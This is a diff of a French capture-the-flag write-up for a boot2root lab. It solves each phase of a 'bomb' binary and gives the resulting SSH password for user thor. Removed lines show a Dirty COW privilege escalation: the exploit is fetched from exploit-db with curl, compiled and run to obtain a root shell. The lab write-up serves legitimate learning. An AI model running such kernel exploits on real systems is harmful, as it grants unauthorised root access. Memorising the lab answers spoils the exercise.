@@ -318,33 +318,113 @@ NO SPACE IN THE PASSWORD (password is case sensitive).
 $ file bomb
 bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.0.0, not stripped
 ```
+Pour la suite nous utiliserons [ghidra](https://ghidra-sre.org/), un logiciel de reverse engineering avec bomb comme executable.
+Ci-dessous un screen de la structure du programme.
 
-Sachant que nous avons un shell stable, il est possible
-de récupérer plus d'informations sur le système:
+`main`
 
-```bash
-laurie@BornToSecHackMe:~$ uname -smr
-Linux 3.2.0-91-generic-pae i686
+![main](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/main.png)
+
+Le programme est donc structure en 6 phases.
+Il faut arriver au bout des 6 phases pour defuse la bombe.
+
+`phase_1`
+
+![phase_1](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_1.png)
+
+Ici, c'est juste une simple comparaison avec la chaine `Public speaking is very easy.`
+
+`phase_2`
+
+![phase_2](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_2.png)
+
+L'utilisateur ici doit rentrer un suite de six nombres separes par un espace (" ").
+La bombe "explose" si le premier chiffre est different de 1.
+La bombe explose si les nombres suivant ne respectent pas la suite:
+`U1 = 1; Un = n * U(n-1)`
+
+On en deduit la suite suivante: `1 2 6 24 120 720`
+
+`phase_3`
+
+![phase_3](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_3.png)
+
+L'utilisateur doit rentrer une ligne au format: nombre - caratere - nombre
+Le premier nombre determine quel switch case est execute.
+Par exemple si on rentre 1, on sera dans le case 1.
+Ensuite le caractere de l'utilisateur sera compare avec un caractere predefini; dans notre exemple "b".
+Enfin le dernier nombre sera compare lui aussi par un nombre predefini; ici 0xd6, soit 214.
+Si les trois sont egaux aux valeurs predefinies du programme, la bombe passe a l'etape suivant,
+sinon elle explose. Ce raisonnement est valide pour tous les cases de la phase.
+
+`phase_4`
+
+![phase_4](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_4.png)
+
+`phase_4_bis`
+
+![phase_4_bis](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_4_bis.png)
+
+Le programme attend un nombre et le passe a la fonction fun4. Il compare le retour de la fonction avec la valeur 55.
+Si ce n'est pas la bonne valeur la bombre explose.
+En regardant le contenu de fun4, on se rend compte vite qu'il s'agit de la suite de fibonnaci.
+55 etant le 9eme terme de la suite, il faut donc rentrer le chiffre 9 pour passer a l'etape suivante.
+
+`phase_5`
+
+![phase_5](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_5.png)
+
+`phase_5_bis`
+
+![phase_5_bis](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_5_bis.png)
+
+Le programme attend une chaine de carateres. Si la longueur est differente de 6 la bombe explose.
+Ensuite il parcourt la chaine, et effecteur les instructions suivant pour chaque caratere:
+- Soit v la valeur ascii du caratere
+- Posons tmp = v & 0xf (ne garde que les 4 bits de poids faible)
+- utilise tmp comme index d'un tableau en global nomme `array.123`
+- recupere array.123[tmp] et stocke le dans un nouveau tableau `local_c`
+
+Enfin le programme verifie que le tableau est egal a la chaine `giants`, sinon la bombe explose.
+Ici nous utiliseront la chaine `opekmq`; bien que `opekma` soit valide aussi.
+
+`phase_6`
+
+![phase_6](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/bomb/phase_6.png)
+
+`nodeStruct`
+```C
+struct nodeStruct {
+    int value;
+    int index;
+    struct nodeStruct *next;
+};
 ```
 
-En 2016, la vulnérabilité [Dirty Cow](https://www.wikiwand.com/fr/Dirty_COW) a été découverte et mise
-publique. Le kernel étant assez ancien, nous allons rechercher quelques exploits avec `searchsploit`.
+Le programme attends une suite de six nombres, sinon la bombe explose.
+Ici plusieurs boucles s'operent. La premiere verifie que chaque chiffre est entre 1 et 6, et differents les un des autres.
+La deuxieme recupere le pointeur d'un noeud d'une liste chainee a l'index precise par un chiffre.
+Pour chaque chiffre (index), le pointeur est stocke dans un tableau de pointeur.
+Ensuite les champs next de chaque noeud sont reordonnes en fonction de l'ordre precise par l'utilisateur.
+Enfin le programme verifie que dans ce nouvel ordre la `value` de chaque est bien en ordre decroissant.
+Sinon la bombe explose.
 
-```bash
-$ searchsploit "Linux Kernel < 3. Dirty"
+Bien qu'il y ait une phase secrete, et plusieurs solutions a la phase 3 et 5; grace aux indices du README il est possible
+d'ignorer la phase secrete et de restreindre le champs des solutions.
+
+On se retrouve donc a la fin avec la chaine suivante:
+`Publicspeakingisveryeasy.126241207201b2149opekmq426315`
+
+Toutefois, probablement par inattention de la part du createur du sujet les deux avant-derniers carateres sont inverses (3 - 1)
+par rapport a ce qui est necessaire pour defuse la bombe. Ce dernier point etait indique sur le forum.
+
+### SSH (thor)
+
 ```
+$ ssh thor@$TARGET
+password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
-![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/searchsploit.png)
-
-Apres plusieurs tests, nous avons choisis l'exploit [**40839**](https://www.exploit-db.com/exploits/40839):
-
-```bash
-$ curl https://www.exploit-db.com/raw/40839 -o dirty.c
-$ sed -i s/firefart/root/ dirty.c # Change l'id de l'user
-$ gcc -pthread dirty.c -o dirty -lcrypt
-$ ./dirty 42
+(thor) $ ls
+exploit_me
+README
 ```
-
-![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/dirty.png)
-
-Nous sommes en possession d'un shell en *uid=0*.
